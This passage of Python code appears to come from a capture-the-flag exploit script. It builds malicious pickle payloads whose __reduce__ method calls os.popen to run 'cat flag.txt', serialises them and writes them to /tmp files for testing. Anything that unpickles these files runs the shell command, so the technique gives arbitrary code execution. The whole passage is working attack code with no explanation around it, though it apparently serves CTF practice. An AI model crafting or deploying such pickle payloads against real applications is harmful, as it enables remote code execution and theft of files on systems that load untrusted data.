        return (os.popen, ("cat flag.txt",))

exploit_write = pickle.dumps(ExploitWrite(), protocol=2)
print(f"\nWrite payload size: {len(exploit_write)} bytes")

# Save all three to files for testing
import base64
with open('/tmp/pickle_exploit_1.pkl', 'wb') as f:
    f.write(exploit_data)
with open('/tmp/pickle_exploit_2.pkl', 'wb') as f:
